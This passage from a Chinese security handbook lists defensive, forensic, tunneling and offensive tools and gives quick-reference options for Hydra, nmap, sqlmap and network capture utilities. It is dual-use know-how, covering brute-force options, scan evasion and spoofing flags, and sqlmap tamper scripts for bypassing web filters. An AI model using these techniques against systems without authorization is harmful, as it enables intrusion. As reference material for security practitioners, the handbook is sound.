        -   [prvd](https://github.com/fate0/prvd)

        -   [phpvulhunter](https://github.com/OneSourceCat/phpvulhunter)

        -   [chip](https://github.com/phith0n/chip) a simple tool to detect potential security threat in php code

    3.  ### Python

        -   [pyvulhunter](https://github.com/shengqi158/pyvulhunter)

        -   [pyt](https://github.com/python-security/pyt)

    4.  ### Java

        -   [find sec bugs](https://github.com/find-sec-bugs/find-sec-bugs)

        -   [Gadget Inspector](https://github.com/JackOfMostTrades/gadgetinspector) A byte code analyzer for finding deserialization gadget chains in Java applications

    5.  ### JavaScript

        -   [NodeJsScan](https://github.com/ajinabraham/NodeJsScan)

    6.  ### 供应链

        -   [Dependency-Track](https://github.com/DependencyTrack/dependency-track) is an intelligent Supply Chain Component Analysis platform that allows organiza- tions to identify and reduce risk from the use of third-party and open source components

7.  ## 防御

    1.  ### 日志检查

        -   [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)

        -   [LastActivityView](http://www.nirsoft.net/utils/computer_activity_view.html)

        -   [Regshot](https://sourceforge.net/projects/regshot/)

        -   [teler](https://github.com/kitabisa/teler) Real-time HTTP Intrusion Detection

    2.  ### 终端监控

        -   [attack monitor](https://github.com/yarox24/attack_monitor) Endpoint detection & Malware analysis software

        -   [artillery](https://github.com/BinaryDefense/artillery) The Artillery Project is an open-source blue team tool designed to protect Linux and Windows operating systems through multiple methods.

        -   [yurita](https://github.com/paypal/yurita) Anomaly detection framework @ PayPal

        -   [crowdsec](https://github.com/crowdsecurity/crowdsec) An open-source, lightweight agent to detect and respond to bad behaviours

        -   [tracee](https://github.com/aquasecurity/tracee) Linux Runtime Security and Forensics using eBPF

    3.  ### XSS 防护

        -   [js xss](https://github.com/leizongmin/js-xss)

        -   [DOMPurify](https://github.com/cure53/DOMPurify)

        -   [google csp evaluator](https://csp-evaluator.withgoogle.com/)

    4.  ### 配置检查

        -   [Attack Surface Analyzer](https://github.com/microsoft/AttackSurfaceAnalyzer) analyze operating system's security configuration for changes during software installation.

        -   [gixy](https://github.com/yandex/gixy) Nginx 配置检查工具

        -   [dockerscan](https://github.com/cr0hn/dockerscan) Docker security analysis & hacking tools

    5.  ### 安全检查

        -   [lynis](https://github.com/CISOfy/lynis) Security auditing tool for Linux, macOS, and UNIX-based systems

        -   [linux malware detect](https://github.com/rfxn/linux-malware-detect)

    6.  ### IDS

        -   [ossec](https://github.com/ossec/ossec-hids)

        -   [yulong](https://github.com/ysrc/yulong-hids)

        -   [AgentSmith](https://github.com/DianrongSecurity/AgentSmith-HIDS)

        -   [ByteDance HIDS](https://github.com/bytedance/ByteDance-HIDS) Cloud-Native Host-Based Intrusion Detection

    7.  ### RASP

        -   [Elkeid](https://github.com/bytedance/Elkeid) Cloud-Native Host-Based Intrusion Detection solution project to provide next-generation Threat Detection and Behavior Audition with modern architecture

        -   [openrasp](https://github.com/baidu-security/openrasp-iast) IAST 灰盒扫描工具

    8.  ### SIEM

        -   [panther](https://github.com/panther-labs/panther) Detect threats with log data and improve cloud security posture

    9.  ### 威胁情报

        -   [threatfeeds](https://threatfeeds.io/)

        -   [abuseipdb](https://www.abuseipdb.com/)

    10. ### APT

        -   [APT Groups and Operations](https://docs.google.com/spreadsheets/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml)

        -   [APTnotes](https://github.com/kbandla/APTnotes)

        -   [APT Hunter](https://github.com/ahmedkhlief/APT-Hunter) Threat Hunting tool for windows event logs which made by purple team mindset to provide detect APT movements hidden in the sea of windows event logs to decrease the time to uncover suspicious activity

    11. ### 入侵检查

        -   [huorong](https://www.huorong.cn/)

        -   [check rootkit](http://www.chkrootkit.org/)

        -   [rootkit hunter](http://rkhunter.sourceforge.net/)

        -   [PC Hunter](http://www.xuetr.com/)

        -   [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)

    12. ### 进程查看

        -   [Process Explorer](https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer)

        -   [ProcessHacker](https://processhacker.sourceforge.io/)

    13. ### Waf

        -   [naxsi](https://github.com/nbs-system/naxsi)

        -   [ModSecurity](https://github.com/SpiderLabs/ModSecurity)

        -   [ngx_lua_waf](https://github.com/loveshell/ngx_lua_waf)

        -   [OpenWAF](https://github.com/titansec/OpenWAF)

    14. ### 病毒在线查杀

        -   [virustotal](https://www.virustotal.com/)

        -   [virscan](http://www.virscan.org/)

        -   [habo](https://habo.qq.com/)

    15. ### WebShell 查杀

        -   [D 盾](http://www.d99net.net/index.asp)

        -   [深信服 WebShell 查杀](http://edr.sangfor.com.cn/backdoor_detection.html)

        -   [php malware finder](https://github.com/nbs-system/php-malware-finder)

    16. ### 规则 / IoC

        -   [malware ioc](https://github.com/eset/malware-ioc)

        -   [fireeye public iocs](https://github.com/fireeye/iocs)

        -   [signature base](https://github.com/Neo23x0/signature-base)

        -   [yara rules](https://github.com/Yara-Rules/rules)

        -   [capa rules](https://github.com/fireeye/capa-rules) standard collection of rules for capa

        -   [AttackDetection](https://github.com/ptresearch/AttackDetection) Suricata PT Open Ruleset

        -   [DailyIOC](https://github.com/StrangerealIntel/DailyIOC) IOC from articles, tweets for archives

    17. ### 威胁检测

        -   [ARTIF](https://github.com/CRED-CLUB/ARTIF) An advanced real time threat intelligence framework to identify threats and malicious web traffic on the basis of IP reputation and historical data

    18. ### Security Advisories

        -   [Apache httpd Security Advisories](https://httpd.apache.org/security/)

        -   [Apache Solr](https://lucene.apache.org/solr/security.html)

        -   [Apache Tomcat](https://tomcat.apache.org/security-8.html)

        -   [Jetty Security Reports](https://www.eclipse.org/jetty/documentation/current/security-reports.html)

        -   [Nginx Security Advisories](http://nginx.org/en/security_advisories.html)

        -   [OpenSSL](https://www.openssl.org/news/vulnerabilities.html)

    19. ### Security Tracker

        -   [Nginx Security Tracker](https://security-tracker.debian.org/tracker/source-package/nginx)

    20. ### 匹配工具

        -   [yara](https://github.com/VirusTotal/yara) The pattern matching swiss knife

        -   [capa](https://github.com/fireeye/capa) The FLARE team's open-source tool to identify capabilities in executable files.

    21. ### DoS 防护

        -   *Gatekeeper \<https://github.com/AltraMayor/gatekeeper\>'\_* open-source DDoS protection system

    22. ### 对手模拟

        -   [sliver](https://github.com/BishopFox/sliver) Adversary Simulation Framework

    23. ### 入侵防护

        -   [fail2ban](https://github.com/fail2ban/fail2ban)

8.  ## 安全开发 {#安全开发}

    1.  ### 风险控制

        -   [aswan](https://github.com/momosecurity/aswan) 陌陌风控系统静态规则引擎

    2.  ### 静态分析

        -   [PHP CodeSniffer](https://github.com/squizlabs/PHP_CodeSniffer) tokenizes PHP files and detects violations of a defined set of coding standards

    3.  ### 安全编码规范

        -   [JAVA 安全 SDK 及编码规范](https://github.com/momosecurity/rhizobia_J)

        -   [PHP 安全 SDK 及编码规范](https://github.com/momosecurity/rhizobia_P)

    4.  ### 漏洞管理

        -   [SRCMS](https://github.com/martinzhou2015/SRCMS)

        -   [洞察](https://github.com/creditease-sec/insight) 宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台

        -   [xunfeng](https://github.com/ysrc/xunfeng) 适用于企业内网的漏洞快速应急，巡航扫描系统

        -   [DefectDojo](https://github.com/DefectDojo/django-DefectDojo) an open-source application vulnerability correlation and security orchestration tool

        -   [Fuxi Scanner](https://github.com/jeffzh3ng/Fuxi-Scanner) Penetration Testing Platform

        -   [SeMF](https://gitee.com/gy071089/SecurityManageFramwork) 企业内网安全管理平台，包含资产管理，漏洞管理，账号管理，知识库管、安全扫描自动化功能模块

    5.  ### DevSecOps

        -   [hunter](https://github.com/ztosec/hunter) 中通 DevSecOps 闭环方案，被动式漏洞扫描器

9.  ## 运维

    1.  ### 流量

        -   [Bro](https://www.bro.org/)

        -   [Moloch](https://github.com/aol/moloch) Large scale, open source, indexed packet capture and search

        -   [TCPFlow](https://github.com/simsong/tcpflow)

#### 10.14. 安全开发 357

-   [TCPDump](http://www.tcpdump.org/)

-   [WireShark](https://www.wireshark.org/)

-   [Argus](https://github.com/salesforce/Argus)

-   [PcapPlusPlus](https://github.com/seladb/PcapPlusPlus)

-   [ngrep](https://github.com/jpr5/ngrep)

-   [cisco joy](https://github.com/cisco/joy) A package for capturing and analyzing network flow data and intraflow data, for network research, forensics, and security monitoring.

-   [NFStream](https://github.com/nfstream/nfstream) a Flexible Network Data Analysis Framework

-   [BruteShark](https://github.com/odedshimon/BruteShark) Network Analysis Tool

    1.  ### 堡垒机

        -   [jumpserver](https://github.com/jumpserver/jumpserver)

        -   [CrazyEye](https://github.com/triaquae/CrazyEye)

        -   [GateOne](https://github.com/liftoff/GateOne)

    2.  ### 蜜罐

        -   [Dionaea](https://github.com/DinoTools/dionaea)

        -   [Modern Honey Network](https://github.com/threatstream/mhn)

        -   [Cowrie](https://github.com/micheloosterhof/cowrie) SSH/Telnet 蜜罐

        -   [honeything](https://github.com/omererdem/honeything) IoT 蜜罐

        -   [ConPot](http://conpot.org/) 工控设施蜜罐

        -   [MongoDB HoneyProxy](https://github.com/Plazmaz/MongoDB-HoneyProxy)

        -   [ElasticHoney](https://github.com/jordan-wright/elastichoney)

        -   [DCEPT](https://github.com/secureworks/dcept)

        -   [Canarytokens](https://github.com/thinkst/canarytokens)

        -   [Honeydrive](http://bruteforcelab.com/honeydrive)

        -   [T-Pot](https://github.com/dtag-dev-sec/tpotce/) The All In One Honeypot Platform

        -   [opencanary](https://github.com/p1r06u3/opencanary_web)

        -   [HFish](https://github.com/hacklcx/HFish)

        -   [kippo](https://github.com/desaster/kippo) SSH Honeypot

        -   [Ehoney](https://github.com/seccome/Ehoney) 欺骗防御系统

    3.  ### VPN Install

        -   [pptp](https://github.com/viljoviitanen/setup-simple-pptp-vpn)

        -   [ipsec](https://github.com/hwdsl2/setup-ipsec-vpn)

        -   [openvpn](https://github.com/Nyr/openvpn-install)

    4.  ### 隧道 / 代理

        -   [ngrok](https://github.com/inconshreveable/ngrok)

        -   [rtcp](https://github.com/knownsec/rtcp)

        -   [Tunna](https://github.com/SECFORCE/Tunna)

        -   [reDuh](https://github.com/sensepost/reDuh) Create a TCP circuit through validly formed HTTP requests

        -   [reGeorg](https://github.com/sensepost/reGeorg) pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn

        -   [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) Neo-reGeorg is a project that seeks to aggressively refactor reGeorg

        -   [ABPTTS](https://github.com/nccgroup/ABPTTS) TCP tunneling over HTTP/HTTPS for web application servers

        -   [frp](https://github.com/fatedier/frp) A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet

        -   [lanproxy](https://github.com/ffay/lanproxy) 内网穿透工具

        -   [ligolo](https://github.com/sysdream/ligolo) Reverse Tunneling made easy for pentesters

        -   [EarthWorm](https://github.com/idlefire/ew) 是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。

        -   [Tunna](https://github.com/SECFORCE/Tunna) is a set of tools which will wrap and tunnel any TCP communication over HTTP

        -   [mssqlproxy](https://github.com/blackarrowsec/mssqlproxy) is a toolkit aimed to perform lateral movement in restricted environments through a com- promised Microsoft SQL Server via socket reuse

        -   [nps](https://github.com/ehang-io/nps) a lightweight, high-performance, powerful intranet penetration proxy server, with a powerful web management terminal

    5.  ### 代理链

        -   [Netch](https://github.com/NetchX/Netch) Support Socks5, Shadowsocks, ShadowsocksR, V2Ray, Trojan proxies. UDP NAT FullCone

        -   [proxychains](https://github.com/haad/proxychains) a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy

        -   [gost](https://github.com/ginuerzh/gost) GO Simple Tunnel

> **10.15. 运维** **359**

6.  ### 资产管理

    -   [BlueKing CMDB](https://github.com/Tencent/bk-cmdb) 面向资产及应用的企业级配置管理平台

    -   [ARL](https://github.com/TophantTechnology/ARL) 资产侦察灯塔系统

7.  ### 合规

    -   [bombus](https://github.com/momosecurity/bombus) 合规审计平台

8.  ### 风控

    -   [nebula](https://github.com/threathunterX/nebula)

    -   [Liudao](https://github.com/ysrc/Liudao) "六道"实时业务风控系统

    -   [aswan](https://github.com/momosecurity/aswan) 陌陌风控系统静态规则引擎

9.  ### SIEM

    -   [metron](https://github.com/apache/metron)

    -   [MozDef](https://github.com/mozilla/MozDef)

10. ### 安全运维

    -   [Scout](https://github.com/HandsomeOne/Scout) URL 监控系统

    -   [OpenDnsdb](https://github.com/qunarcorp/open_dnsdb) 基于 Python 的 DNS 管理系统

11. ### 系统监控

    -   [netdata](https://github.com/netdata/netdata) Real-time performance monitoring

    -   [bcc](https://github.com/iovisor/bcc) Tools for BPF-based Linux IO analysis, networking, monitoring, and more

12. ### Windows

    -   [Windows Sysinternals](https://docs.microsoft.com/zh-cn/sysinternals)

13. ### 网络测试

    -   [Toxiproxy](https://github.com/Shopify/toxiproxy) A TCP proxy to simulate network and system conditions for chaos and resiliency testing

14. ### 红队模拟

    -   [CALDERA](https://github.com/mitre/caldera) Scalable Automated Adversary Emulation Platform

15. ### 网络模拟

    -   [Internet Emulator](https://github.com/seed-labs/seed-emulator) A Python framework for creating emulation of the Internet

&nbsp;

1.  ## 取证

    1.  ### 内存取证

        -   [SfAntiBotPro](http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z)

        -   [volatility](https://github.com/volatilityfoundation/volatility)

        -   [Rekall](https://github.com/google/rekall) Memory Forensic Framework

        -   [LiME](https://github.com/504ensicsLabs/LiME) LiME (formerly DMD) is a Loadable Kernel Module (LKM), which allows the acquisition of volatile memory from Linux and Linux-based devices, such as those powered by Android.

        -   [AVML](https://github.com/microsoft/avml) Acquire Volatile Memory for Linux

2.  ## 其他

    1.  ### 综合框架

        -   [metasploit](https://www.metasploit.com/)

        -   [w3af](http://w3af.org/)

        -   [AutoSploit](https://github.com/NullArray/AutoSploit/)

        -   [Nikto](https://cirt.net/nikto2)

        -   [skipfish](https://my.oschina.net/u/995648/blog/114321)

        -   [Arachni](http://www.arachni-scanner.com/)

        -   [ZAP](http://www.freebuf.com/sectool/5427.html)

        -   [BrupSuite](https://portswigger.net/burp/)

        -   [Spiderfoot](https://github.com/smicallef/spiderfoot)

        -   [AZScanner](https://github.com/az0ne/AZScanner)

        -   [Fuxi](https://github.com/jeffzh3ng/Fuxi-Scanner)

#### 10.16. 取证 361

-   [vooki](https://www.vegabird.com/vooki/)

-   [BadMod](https://github.com/MrSqar-Ye/BadMod)

-   [fsociety](https://github.com/Manisso/fsociety) Hacking Tools Pack

-   [axiom](https://github.com/pry0cc/axiom) A dynamic infrastructure toolkit for red teamers and bug bounty hunters

2.  ### 验证码

    -   [CAPTCHA22](https://github.com/FSecureLABS/captcha22) is a toolset for building, and training, CAPTCHA cracking models using neural networks.

3.  ### WebAssembly

    -   [wabt](https://github.com/WebAssembly/wabt)

    -   [binaryen](https://github.com/WebAssembly/binaryen)

    -   [wasmdec](https://github.com/wwwg/wasmdec)

4.  ### 混淆

    -   [JStillery](https://github.com/mindedsecurity/JStillery)

    -   [javascript obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)

    -   [基于 hook 的 php 混淆解密](https://github.com/CaledoniaProject/php-decoder)

    -   [Invoke Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

5.  ### Proxy Pool

    -   [proxy pool by jhao104](https://github.com/jhao104/proxy_pool)

    -   [Proxy Pool by Germey](https://github.com/Python3WebSpider/ProxyPool)

    -   [scylla](https://github.com/imWildCat/scylla)

6.  ### Android

    -   [DroidSSLUnpinning](https://github.com/WooyunDota/DroidSSLUnpinning) Android certificate pinning disable tools

7.  ### 其他 {#其他}

    -   [Serverless Toolkit](https://github.com/ropnop/serverless_toolkit)

    -   [Rendering Engine Probe](https://github.com/PortSwigger/hackability)

    -   [httrack](http://www.httrack.com/)

    -   [curl](https://curl.haxx.se/)

    -   [htrace](https://github.com/trimstray/htrace.sh)

    -   [Microsoft Sysinternals Utilities](https://docs.microsoft.com/en-us/sysinternals/downloads/)

<span id="_bookmark108" class="anchor"></span>CHAPTER 11

手册速查

1.  ## 爆破工具

    1.  ### Hydra

        -   -R 继续从上一次进度破解

        -   -S 使用 SSL 链接

        -   -s\<PORT\> 指定端口

        -   -l\<LOGIN\> 指定破解的用户

        -   -L\<FILE\> 指定用户名字典

        -   -p\<PASS\> 指定密码破解

        -   -P\<FILE\> 指定密码字典

        -   -e\<ns\> 可选选项，n：空密码试探，s：使用指定用户和密码试探

        -   -C\<FILE\> 使用冒号分割格式，例如"user:pwd" 来代替-L/-P 参数

        -   -M\<FILE\> 指定目标列表文件一行一条

        -   -o\<FILE\> 指定结果输出文件

        -   -f 在使用-M 参数以后，找到第一对登录名或者密码的时候中止破解

        -   -t\<TASKS\> 同时运行的线程数，默认为 16

        -   -w\<TIME\> 设置最大超时的时间，单位秒，默认是 30s

        -   -vV 显示详细过程

2.  ## 下载工具

    1.  ### wget

#### 常用

-   普通下载 wget <http://example.com/file.iso>

-   指定保存文件名 wget ‐‐output-document=myname.iso <http://example.com/file.iso>

-   保存到指定目录 wget ‐‐directory-prefix=folder/subfolder <http://example.com/file.iso>

-   大文件断点续传 wget ‐‐continue <http://example.com/big.file.iso>

-   下载指定文件中的 url 列表 wget ‐‐input list-of-file-urls.txt

-   下载指定数字列表的多个文件 wget [http://example.com/images/{1..20}.jpg](http://example.com/images/)

-   下 载 web 页 面 的 所 有 资 源 wget ‐‐page-requisites ‐‐span-hosts ‐‐convert-links

> ‐‐adjust-extension <http://example.com/dir/file>

#### 整站下载

-   下载所有链接的页面和文件 wget ‐‐execute robots=off ‐‐recursive ‐‐no-parent ‐‐continue

> ‐‐no-clobber <http://example.com/>

-   下载指定后缀的文件 wget ‐‐level=1 ‐‐recursive ‐‐no-parent ‐‐accept mp3,MP3 http:// example.com/mp3/

-   排除指定目录下载 wget ‐‐recursive ‐‐no-clobber ‐‐no-parent ‐‐exclude-directories / forums,/support [http://example.com](http://example.com/)

#### 指定参数

-   user agent ‐‐user-agent=\"Mozilla/5.0 Firefox/4.0.1\"

-   basic auth ‐‐http-user=user ‐‐http-password=pwd

-   保存 cookie ‐‐cookies=on ‐‐save-cookies cookies.txt ‐‐keep-session-cookies

-   使用 cookie ‐‐cookies=on ‐‐load-cookies cookies.txt ‐‐keep-session-cookies

### curl

#### 常用

-   直接显示 curl [www.example.com](http://www.example.com/)

-   保存指定的名字 -o newname

-   不指定名字 -O

#### 正则

-   文件名 curl ftp://example.com/file\[1-100\].txt

-   域名 curl [http://site.{one,two,three}.com](http://site/)

3.  ## 流量相关

    1.  ### TCPDump

> TCPDump 是一款数据包的抓取分析工具，可以将网络中传送的数据包的完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供逻辑语句来过滤包。

#### 命令行常用选项

-   -B \<buffer_size\> 抓取流量的缓冲区大小，若过小则可能丢包，单位为 KB

-   -c \<count\> 抓取 n 个包后退出

-   -C \<file_size\> 当前记录的包超过一定大小后，另起一个文件记录，单位为 MB

-   -i \<interface\> 指定抓取网卡经过的流量

-   -n 不转换地址

-   -r \<file\> 读取保存的 pcap 文件

-   -s \<snaplen\> 从每个报文中截取 snaplen 字节的数据，0 为所有数据

-   -q 输出简略的协议相关信息，输出行都比较简短。

-   -W \<cnt\> 写满 cnt 个文件后就不再写入

-   #### -w \<file\> 保存流量至文件

    -   按时间分包时，可使用 strftime 的格式命名，例如 %Y\_%m\_%d\_%H\_%M\_%S.pcap

-   -G \<seconds\> 按时间分包

-   -v 产生详细的输出，-vv -vvv 会产生更详细的输出

-   -X 输出报文头和包的内容

-   -Z \<user\> 在写文件之前，转换用户

### Bro

> Bro 是一个开源的网络流量分析工具，支持多种协议，可实时或者离线分析流量。

#### 命令行

-   实时监控 bro -i \<interface\> \<list of script to load\>

-   分析本地流量 bro -r \<pcapfile\> \<scripts\...\>

-   分割解析流量后的日志 bro-cut

#### 脚本

> 为了能够扩展和定制 Bro 的功能，Bro 提供了一个事件驱动的脚本语言。

### tcpflow

> tcpflow 也是一个抓包工具，它的特点是以流为单位显示数据内容，在分析 HTTP 等协议的数据时候，用
>
> tcpflow 会更便捷。

#### 命令行常用选项

-   -b max_bytes 定义最大抓取流量

-   -e name 指定解析的 scanner

-   -i interface 指定抓取接口

-   -o outputdir 指定输出文件夹

-   -r file 读取文件

-   -R file 读取文件，但是只读取完整的文件

### tshark

> WireShark 的命令行工具，可以通过命令提取自己想要的数据，可以重定向到文件，也可以结合上层语言来调用命令行，实现对数据的处理。

#### 输入接口

-   -i \<interface\> 指定捕获接口，默认是第一个非本地循环接口

-   -f \<capture filter\> 设置抓包过滤表达式，遵循 libpcap 过滤语法，这个选项在抓包的过程中过滤，如果是分析本地文件则用不到

-   -s \<snaplen\> 设置快照长度，用来读取完整的数据包，因为网络中传输有 65535 的限制，值 0 代表快照长度 65535，默认为 65535

-   -p 以非混合模式工作，即只关心和本机有关的流量

-   -B \<buffer size\> 设置缓冲区的大小，只对 windows 生效，默认是 2M

-   -y \<link type\> 设置抓包的数据链路层协议，不设置则默认为 -L 找到的第一个协议

-   -D 打印接口的列表并退出

-   -L 列出本机支持的数据链路层协议，供-y 参数使用。

-   -r \<infile\> 设置读取本地文件

#### 捕获停止选项

-   -c \<packet count\> 捕获 n 个包之后结束，默认捕获无限个

-   #### -a \<autostop cond\>

    -   duration:NUM 在 num 秒之后停止捕获

    -   filesize:NUM 在 numKB 之后停止捕获

    -   files:NUM 在捕获 num 个文件之后停止捕获

#### 处理选项

-   -Y \<display filter\> 使用读取过滤器的语法，在单次分析中可以代替 -R 选项

-   -n 禁止所有地址名字解析（默认为允许所有）

-   -N 启用某一层的地址名字解析。m 代表 MAC 层，n 代表网络层，t 代表传输层，C 代表当前异步 DNS查找。如果 -n 和 -N 参数同时存在，-n 将被忽略。如果 -n 和 -N 参数都不写，则默认打开所有地址名字解析。

-   -d 将指定的数据按有关协议解包输出，如要将 tcp 8888 端口的流量按 http 解包，应该写为 -d tcp. port==8888,http 。可用 tshark -d 列出所有支持的有效选择器。

#### 输出选项

-   -w \<outfile\> 设置 raw 数据的输出文件。不设置时为 stdout

-   -F \<output file type\> 设置输出的文件格式，默认是 .pcapng，使用 tshark -F 可列出所有支持的输出文件类型

-   -V 增加细节输出

-   -O \<protocols\> 只显示此选项指定的协议的详细信息

-   -P 即使将解码结果写入文件中，也打印包的概要信息

-   -S \<separator\> 行分割符

-   -x 设置在解码输出结果中，每个 packet 后面以 HEX dump 的方式显示具体数据

-   -T pdml\|ps\|text\|fields\|psml 设置解码结果输出的格式，默认为 text

-   -e 如果 -T 选项指定，-e 用来指定输出哪些字段

-   -t a\|ad\|d\|dd\|e\|r\|u\|ud 设置解码结果的时间格式

-   -u s\|hms 格式化输出秒

-   -l 在输出每个包之后 flush 标准输出

-   -q 结合 -z 选项进行使用，来进行统计分析

-   -X \<key\>:\<value\> 扩展项，lua_script、read_format

-   -z 统计选项，具体的参考文档

#### 其他选项

-   -h 显示命令行帮助

-   -v 显示 tshark 的版本信息

4.  ## 嗅探工具

    1.  ### Nmap

> nmap \[\< 扫描类型 \>\...\] \[\< 选项 \>\] {\< 扫描目标说明 \>}

#### 指定目标

-   CIDR 风格 192.168.1.0/24

-   逗号分割 [www.baidu.com,www.zhihu.com](http://www.zhihu.com/)

-   分割线 10.22-25.43.32

-   来自文件 -iL \<inputfile\>

-   排 除 不 需 要 的 host \--exclude \<host1 \[, host2\] \[, host3\] \... \> \--excludefile

> \<excludefile\>

#### 主机发现

-   -sL List Scan - simply list targets to scan

-   -sn/-sP Ping Scan - disable port scan

-   -Pn Treat all hosts as online -- skip host discovery

-   -sS/sT/sA/sW/sM TCP SYN/Connect()/ACK/Window/Maimon scans

-   -sU UDP Scan

-   -sN/sF/sX TCP Null, FIN, and Xmas scans

> 表 1: 扫描方式表

+------------+------+------------+-----------+------------+----------+------------+--------------------------+
| 名称       |      | 包标记     | 端口      | OPEN       | 端口     | CLOSE      | 特点                     |
+============+======+============+===========+============+==========+============+==========================+
| TCP        | SYN  | SYN        | 回复      | ACK+SYN    | 回复     | RST        | 应用程序无日志，         |
|            |      |            |           |            |          |            |                          |
| scan       |      |            |           |            |          |            | 但是容易被发现           |
+------------+------+------------+-----------+------------+----------+------------+--------------------------+
| 全连接扫描 |      | SYN        | 回复      | ACK+SYN    | 回复     | RST        | 容易被发现               |
+------------+------+------------+-----------+------------+----------+------------+--------------------------+
| ACK 扫描   |      | ACK        | 回复      | RST        | 包被丢弃 |            | .                        |
+------------+------+------------+-----------+------------+----------+------------+--------------------------+
| FIN 扫描   |      | FIN        | 包被丢弃  |            | 回复     | RST        | 需要等待超时，效         |
|            |      |            |           |            |          |            |                          |
|            |      |            |           |            |          |            | 率低                     |
+------------+------+------------+-----------+------------+----------+------------+--------------------------+
| TCP        | Xmas | FIN+URG+PS | H包被丢弃 |            | 回复     | RST        | 需要等待超时，效         |
|            |      |            |           |            |          |            |                          |
| 扫描       |      |            |           |            |          |            | 率低；不适用所有操作系统 |
+------------+------+------------+-----------+------------+----------+------------+--------------------------+
| TCP        | NULL | NULL       | 包被丢弃  |            | 回复     | RST        | 需要等待超时，效         |
|            |      |            |           |            |          |            |                          |
| 扫描       |      |            |           |            |          |            | 率低；不适用所有操作系统 |
+------------+------+------------+-----------+------------+----------+------------+--------------------------+

#### 端口扫描

-   \--scanflags 定制的 TCP 扫描

-   -P0 无 ping

-   PS \[port list\] (TCP SYN ping) // need root on Unix

-   PA \[port list\] (TCP ACK ping)

-   PU \[port list\] (UDP ping)

-   PR (Arp ping)

-   p \<port message\>

-   F 快速扫描

-   r 不使用随机顺序扫描

#### 服务和版本探测

-   -sV 版本探测

-   \--allports 不为版本探测排除任何端口

-   \--version-intensity \<intensity\> 设置版本扫描强度

-   \--version-light 打开轻量级模式 // 级别 2

-   \--version-all 尝试每个探测 // 级别 9

-   \--version-trace 跟踪版本扫描活动

-   -sR RPC 扫描

#### 操作系统扫描

-   -O 启用操作系统检测

-   \--osscan-limit 针对指定的目标进行操作系统检测

-   \--osscan-guess

-   \--fuzzy 推测操作系统检测结果

#### 时间和性能

-   **调整并行扫描组的大小**

    -   \--min-hostgroup\<milliseconds\>

    -   \--max-hostgroup\<milliseconds\>

-   #### 调整探测报文的并行度

    -   \--min-parallelism\<milliseconds\>

    -   \--max-parallelism\<milliseconds\>

-   #### 调整探测报文超时

    -   \--min_rtt_timeout \<milliseconds\>

    -   \--max-rtt-timeout \<milliseconds\>

    -   \--initial-rtt-timeout \<milliseconds\>

-   #### 放弃低速目标主机

    -   \--host-timeout\<milliseconds\>

-   #### 调整探测报文的时间间隔

    -   \--scan-delay\<milliseconds\>

    -   \--max_scan-delay\<milliseconds\>

-   #### 设置时间模板

    -   -T \<Paranoid\|Sneaky\|Polite\|Normal\|Aggressive\|Insane\>

> **--** -T\<0-5\> (越大越快)

#### 逃避检测相关

-   -f 报文分段

-   \--mtu 使用指定的 MTU

-   -D\<decoy1\[，decoy2\]\[，ME\]，\...\> 使用诱饵隐蔽扫描

-   -S\<IP_Address\> 源地址哄骗

-   -e \<interface\> 使用指定的接口

-   \--source-port\<portnumber\>;-g\<portnumber\> 源端口哄骗

-   \--data-length\<number\> 发送报文时附加随机数据

-   \--ttl \<value\> 设置 ttl

-   \--randomize-hosts 对目标主机的顺序随机排列

-   \--spoof-mac\<macaddress，prefix，orvendorname\> MAC 地址哄骗

#### 输出

-   -oN\<filespec\> 标准输出

-   -oX\<filespec\> XML 输出

-   -oS\<filespec\> ScRipTKIdd\|3oUTpuT

-   -oG\<filespec\> Grep 输出

-   -oA\<basename\> 输出至所有格式

-   \--open 仅输出可能开放的端口信息

#### 细节和调试

-   -v 信息详细程度

-   -d \[level\] debug level

-   \--packet-trace 跟踪发送和接收的报文

-   \--iflist 列举接口和路由

### Masscan

#### 编译

> **命令行选项**

-   \--ports 指定端口范围

-   \--rate 指定速率

-   \--source-ip 指定源 IP

## SQLMap 使用

> 安装 git clone https://github.com/sqlmapproject/sqlmap.git sqlmap

1.  ### 常用参数

    -   -u \--url 指定目标 url

    -   -m 从文本中获取多个目标扫描

    -   -r 从文件中加载 HTTP 请求

    -   \--data 以 POST 方式提交数据

    -   -random-agent 随机 ua

    -   \--user-agent 指定 ua

    -   \--delay 设置请求间的延迟

    -   \--timeout 指定超时时间

    -   \--dbms 指定 db，sqlmap 支持的 db 有 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite 等

    -   \--os 指定数据库服务器操作系统

    -   \--tamper 指定 tamper

    -   \--level 指定探测等级

    -   \--risk 指定风险等级

    -   #### \--technique 注入技术

        -   B: Boolean-based blind SQL injection

        -   E: Error-based SQL injection

        -   U: UNION query SQL injection

        -   S: Stacked queries SQL injection

        -   T: Time-based blind SQL injection

2.  ### Tamper 速查

-------------------------------------------------------------------------------------------------------------------
  脚本名称                       作用
------------------------------ ------------------------------------------------------------------------------------
  apostrophemask.py              用 utf8 代替引号

  equaltolike.py                 like 代替等号

  space2dash.py                  绕过过滤'=' 替换空格字符 (")，(" - ') 后跟一个破折号注释，一个随机字符串和一个新行

  greatest.py                    绕过过滤'\>' , 用 GREATEST 替换大于号。

  space2hash.py                  空格替换为 \# 号随机字符串以及换行符

  apostrophenullencode.py        绕过过滤双引号，替换字符和双引号。

  halfversionedmorekeywords.py   当数据库为 mysql 时绕过防火墙，每个关键字之前添加 mysql 版本评论

  space2morehash.py              空格替换为 \# 号以及更多随机字符串换行符

  appendnullbyte.py              在有效负荷结束位置加载零字节字符编码

  ifnull2ifisnull.py             绕过对 IFNULL 过滤。替换类似'IFNULL(A, B)' 为'IF(ISNULL(A), B, A)'

